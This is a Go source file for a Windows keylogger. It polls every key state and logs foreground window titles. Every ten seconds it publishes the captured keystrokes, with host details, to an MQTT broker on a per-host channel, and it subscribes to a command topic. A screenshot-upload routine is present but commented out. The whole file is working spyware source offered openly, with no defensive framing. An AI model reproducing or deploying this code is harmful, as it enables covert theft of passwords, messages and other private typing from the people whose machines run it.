package main

import (
	"fmt"
	"os"
	"syscall"
	"time"
	"unsafe"
	"log"
	"github.com/AllenDang/w32"
	"github.com/eclipse/paho.mqtt.golang"
	"github.com/vova616/screenshot"
	"image"
	"image/png"
	"io/ioutil"
	"os/exec"
	"strings"
	"bytes"
	"runtime"
)

var (
	user32                  = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState    = user32.NewProc("GetAsyncKeyState")
	procGetForegroundWindow = user32.NewProc("GetForegroundWindow") //GetForegroundWindow
	procGetWindowTextW      = user32.NewProc("GetWindowTextW")      //GetWindowTextW

	tmpKeylog string
	tmpTitle  string

	vClient     mqtt.Client
	channel     string
	keyBrackets string
)

var vh mqtt.MessageHandler = func(client mqtt.Client, msg mqtt.Message) {
	fmt.Println("[ ", time.Now(), "]", " Message received: ")
	fmt.Printf("TOPIC: %s\n", msg.Topic())
	fmt.Printf("MSG: %s\n", msg.Payload())
}

type GoInfoObject struct {
	GoOS     string
	Kernel   string
	Core     string
	Platform string
	OS       string
	Hostname string
	CPUs     int
}

//Get Active Window Title
func getForegroundWindow() (hwnd syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)
	if e1 != 0 {
		err = error(e1)
		return
	}
	hwnd = syscall.Handle(r0)
	return
}

func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32, err error) {
	r0, _, e1 := syscall.Syscall(procGetWindowTextW.Addr(), 3, uintptr(hwnd), uintptr(unsafe.Pointer(str)), uintptr(maxCount))
	len = int32(r0)
	if len == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func windowLogger() {
	for {
		g, _ := getForegroundWindow()
		b := make([]uint16, 200)
		_, err := getWindowText(g, &b[0], int32(len(b)))
		if err != nil {
		}
		if syscall.UTF16ToString(b) != "" {
			if tmpTitle != syscall.UTF16ToString(b) {
				tmpTitle = syscall.UTF16ToString(b)
				tmpKeylog += string("\n[" + syscall.UTF16ToString(b) + "]\n")
			}
		}
		time.Sleep(1 * time.Millisecond)
	}
}

func keyLogger() {
	for {
		//time.Sleep(1 * time.Nanosecond)
		for KEY := 0; KEY <= 256; KEY++ {
			time.Sleep(1 * time.Nanosecond)
			Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
			//fmt.Println(Val, val2, val3)
			if int(Val) != 0 {
				switch KEY {
				case w32.VK_CONTROL:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Ctrl")
				case w32.VK_BACK:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Back")
				case w32.VK_TAB:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Tab")
				case w32.VK_RETURN:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Enter")
				case w32.VK_SHIFT:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Shift")
				case w32.VK_MENU:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Alt")
				case w32.VK_CAPITAL:
					tmpKeylog += fmt.Sprintf(keyBrackets, "CapsLock")
				case w32.VK_ESCAPE:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Esc")
				case w32.VK_SPACE:
					tmpKeylog += " "
				case w32.VK_PRIOR:
					tmpKeylog += fmt.Sprintf(keyBrackets, "PageUp")
				case w32.VK_NEXT:
					tmpKeylog += fmt.Sprintf(keyBrackets, "PageDown")
				case w32.VK_END:
					tmpKeylog += fmt.Sprintf(keyBrackets, "End")
				case w32.VK_HOME:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Home")
				case w32.VK_LEFT:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Left")
				case w32.VK_UP:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Up")
				case w32.VK_RIGHT:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Right")
				case w32.VK_DOWN:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Down")
				case w32.VK_SELECT:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Select")
				case w32.VK_PRINT:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Print")
				case w32.VK_EXECUTE:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Execute")
				case w32.VK_SNAPSHOT:
					tmpKeylog += fmt.Sprintf(keyBrackets, "PrintScreen")
				case w32.VK_INSERT:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Insert")
				case w32.VK_DELETE:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Delete")
				case w32.VK_HELP:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Help")
				case w32.VK_LWIN:
					tmpKeylog += fmt.Sprintf(keyBrackets, "LeftWindows")
				case w32.VK_RWIN:
					tmpKeylog += fmt.Sprintf(keyBrackets, "RightWindows")
				case w32.VK_APPS:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Applications")
				case w32.VK_SLEEP:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Sleep")
				case w32.VK_NUMPAD0:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Pad 0")
				case w32.VK_NUMPAD1:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Pad 1")
				case w32.VK_NUMPAD2:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Pad 2")
				case w32.VK_NUMPAD3:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Pad 3")
				case w32.VK_NUMPAD4:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Pad 4")
				case w32.VK_NUMPAD5:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Pad 5")
				case w32.VK_NUMPAD6:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Pad 6")
				case w32.VK_NUMPAD7:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Pad 7")
				case w32.VK_NUMPAD8:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Pad 8")
				case w32.VK_NUMPAD9:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Pad 9")
				case w32.VK_MULTIPLY:
					tmpKeylog += "*"
				case w32.VK_ADD:
					tmpKeylog += "+"
				case w32.VK_SEPARATOR:
					tmpKeylog += fmt.Sprintf(keyBrackets, "Separator")
				case w32.VK_SUBTRACT:
					tmpKeylog += "-"
				case w32.VK_DECIMAL:
					tmpKeylog += "."
				case w32.VK_DIVIDE:
					tmpKeylog += "Devide"
				case w32.VK_F1:
					tmpKeylog += fmt.Sprintf(keyBrackets, "F1")
				case w32.VK_F2:
					tmpKeylog += fmt.Sprintf(keyBrackets, "F2")
				case w32.VK_F3:
					tmpKeylog += fmt.Sprintf(keyBrackets, "F3")
				case w32.VK_F4:
					tmpKeylog += fmt.Sprintf(keyBrackets, "F4")
				case w32.VK_F5:
					tmpKeylog += fmt.Sprintf(keyBrackets, "F5")
				case w32.VK_F6:
					tmpKeylog += fmt.Sprintf(keyBrackets, "F6")
				case w32.VK_F7:
					tmpKeylog += fmt.Sprintf(keyBrackets, "F7")
				case w32.VK_F8:
					tmpKeylog += fmt.Sprintf(keyBrackets, "F8")
				case w32.VK_F9:
					tmpKeylog += fmt.Sprintf(keyBrackets, "F9")
				case w32.VK_F10:
					tmpKeylog += fmt.Sprintf(keyBrackets, "F10")
				case w32.VK_F11:
					tmpKeylog += fmt.Sprintf(keyBrackets, "F11")
				case w32.VK_F12:
					tmpKeylog += fmt.Sprintf(keyBrackets, "F12")
				case w32.VK_NUMLOCK:
					tmpKeylog += fmt.Sprintf(keyBrackets, "NumLock")
				case w32.VK_SCROLL:
					tmpKeylog += fmt.Sprintf(keyBrackets, "ScrollLock")
				case w32.VK_LSHIFT:
					tmpKeylog += fmt.Sprintf(keyBrackets, "LeftShift")
				case w32.VK_RSHIFT:
					tmpKeylog += fmt.Sprintf(keyBrackets, "RightShift")
				case w32.VK_LCONTROL:
					tmpKeylog += fmt.Sprintf(keyBrackets, "LeftCtrl")
				case w32.VK_RCONTROL:
					tmpKeylog += fmt.Sprintf(keyBrackets, "RightCtrl")
				case w32.VK_LMENU:
					tmpKeylog += fmt.Sprintf(keyBrackets, "LeftMenu")
				case w32.VK_RMENU:
					tmpKeylog += fmt.Sprintf(keyBrackets, "RightMenu")
				case w32.VK_OEM_1:
					tmpKeylog += ";"
				case w32.VK_OEM_2:
					tmpKeylog += "/"
				case w32.VK_OEM_3:
					tmpKeylog += "`"
				case w32.VK_OEM_4:
					tmpKeylog += "["
				case w32.VK_OEM_5:
					tmpKeylog += "\\"
				case w32.VK_OEM_6:
					tmpKeylog += "]"
				case w32.VK_OEM_7:
					tmpKeylog += "'"
				case w32.VK_OEM_PERIOD:
					tmpKeylog += "."
				case 0x30:
					tmpKeylog += "0"
				case 0x31:
					tmpKeylog += "1"
				case 0x32:
					tmpKeylog += "2"
				case 0x33:
					tmpKeylog += "3"
				case 0x34:
					tmpKeylog += "4"
				case 0x35:
					tmpKeylog += "5"
				case 0x36:
					tmpKeylog += "6"
				case 0x37:
					tmpKeylog += "7"
				case 0x38:
					tmpKeylog += "8"
				case 0x39:
					tmpKeylog += "9"
				case 0x41:
					tmpKeylog += "a"
				case 0x42:
					tmpKeylog += "b"
				case 0x43:
					tmpKeylog += "c"
				case 0x44:
					tmpKeylog += "d"
				case 0x45:
					tmpKeylog += "e"
				case 0x46:
					tmpKeylog += "f"
				case 0x47:
					tmpKeylog += "g"
				case 0x48:
					tmpKeylog += "h"
				case 0x49:
					tmpKeylog += "i"
				case 0x4A:
					tmpKeylog += "j"
				case 0x4B:
					tmpKeylog += "k"
				case 0x4C:
					tmpKeylog += "l"
				case 0x4D:
					tmpKeylog += "m"
				case 0x4E:
					tmpKeylog += "n"
				case 0x4F:
					tmpKeylog += "o"
				case 0x50:
					tmpKeylog += "p"
				case 0x51:
					tmpKeylog += "q"
				case 0x52:
					tmpKeylog += "r"
				case 0x53:
					tmpKeylog += "s"
				case 0x54:
					tmpKeylog += "t"
				case 0x55:
					tmpKeylog += "u"
				case 0x56:
					tmpKeylog += "v"
				case 0x57:
					tmpKeylog += "w"
				case 0x58:
					tmpKeylog += "x"
				case 0x59:
					tmpKeylog += "y"
				case 0x5A:
					tmpKeylog += "z"
				}
			}
		}
	}
}

func create() {
	mqtt.ERROR = log.New(os.Stdout, "", 0)

	hostame, _ := os.Hostname()
	channel = "client/" + hostame
	opts := mqtt.NewClientOptions().AddBroker("tcp://127.0.0.1:1883").SetClientID(hostame)
	opts.SetKeepAlive(2 * time.Second)
	opts.SetDefaultPublishHandler(vh)
	opts.SetPingTimeout(1 * time.Second)
	opts.SetWill(channel, "Host: "+hostame+" disconnected", 2, false)
	opts.AutoReconnect = true
	vClient = mqtt.NewClient(opts)

	if token := vClient.Connect(); token.Wait() && token.Error() != nil {
		panic(token.Error())
	}
	subscribeChannel(channel + "/cmd")
}

func sendMsg(topic string, payload string, qos byte, retained bool) mqtt.Token {
	token := vClient.Publish(topic, qos, retained, payload)
	token.Wait()
	return token
}

func sendLog() {
	create()
	for vClient.IsConnected() {
		time.Sleep(10 * time.Second)
		if tmpKeylog == "" {
			fmt.Print("\nNothing to show")
			continue
		}
		fmt.Print(tmpKeylog)
		token := sendMsg(channel, tmpKeylog, byte(0), false)
		if token.Error() != nil {
			fmt.Println(token.Error())
			os.Exit(1)
		}
		tmpKeylog = ""
	}
}

func captureScreen() {
	for {
		img, err := screenshot.CaptureRect(image.Rect(0, 0, 1920, 1080))
		if err != nil {
			panic(err)
		}
		f, err := os.Create("./ss.png")
		if err != nil {
			panic(err)
		}
		err = png.Encode(f, img)
		if err != nil {
			continue
		}
		contents, _ := ioutil.ReadAll(f)
		f.Close()
		fmt.Println(len(img.Pix))

		sendMsg(channel+"/img", string(contents), 0, true)
		time.Sleep(10 * time.Minute)
	}
}

func subscribeChannel(topic string) mqtt.Token {
	token := vClient.Subscribe(topic, 0, nil)
	token.Wait()
	return token

}

func sendOnStart(){
	sendMsg(channel, GetInfo().getPcInfo(), 2, true)
}

func main() {
	fmt.Println("Starting KeyLogger!")
	keyBrackets = "{%s}"
	go keyLogger()
	go windowLogger()
	go sendLog()
	sendOnStart()
	//go captureScreen()

	fmt.Println("Press Enter to Exit.")
	os.Stdin.Read([]byte{0})
	for {
		time.Sleep(1 * time.Minute)
		if !vClient.IsConnected() {
			vClient.Connect()
			go sendLog()
		}
	}
}

func GetInfo() *GoInfoObject {
	cmd := exec.Command("cmd", "ver")
	cmd.Stdin = strings.NewReader("some input")
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		panic(err)
	}
	osStr := strings.Replace(out.String(), "\n", "", -1)
	osStr = strings.Replace(osStr, "\r\n", "", -1)
	tmp1 := strings.Index(osStr, "[Version")
	tmp2 := strings.Index(osStr, "]")
	var ver string
	if tmp1 == -1 || tmp2 == -1 {
		ver = "unknown"
	} else {
		ver = osStr[tmp1+9:tmp2]
	}
	gio := &GoInfoObject{Kernel: "windows", Core: ver, Platform: "unknown", OS: "windows", GoOS: runtime.GOOS, CPUs: runtime.NumCPU()}
	gio.Hostname, _ = os.Hostname()
	return gio
}

func (gi *GoInfoObject) VarDump() {
	fmt.Println("GoOS:", gi.GoOS)
	fmt.Println("Kernel:", gi.Kernel)
	fmt.Println("Core:", gi.Core)
	fmt.Println("Platform:", gi.Platform)
	fmt.Println("OS:", gi.OS)
	fmt.Println("Hostname:", gi.Hostname)
	fmt.Println("CPUs:", gi.CPUs)
}

func (gi *GoInfoObject) getPcInfo() string {
	return fmt.Sprintf("GoOS:%v\nKernel:%v\nCore:%v\nPlatform:%v\nOS:%v\nHostname:%v\nCPUs:%v", gi.GoOS, gi.Kernel, gi.Core, gi.Platform, gi.OS, gi.Hostname, gi.CPUs)
}
